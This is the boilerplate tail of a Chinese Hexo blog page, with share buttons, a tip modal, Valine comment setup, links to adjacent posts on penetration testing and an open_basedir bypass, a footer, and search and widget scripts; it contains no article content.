                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
        serverURLs: '',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="渗透测试流程&amp;外网打点">
                        
                        <span class="card-title">渗透测试流程&amp;外网打点</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-12-31
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
                                    内网渗透
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">内网渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/12/25/open-basedir-wakeup-rao-guo/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="open_basedir+wake_up绕过总结">
                        
                        <span class="card-title">open_basedir+wake_up绕过总结</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="post-category">
                                    web知识总结
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">基本知识</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
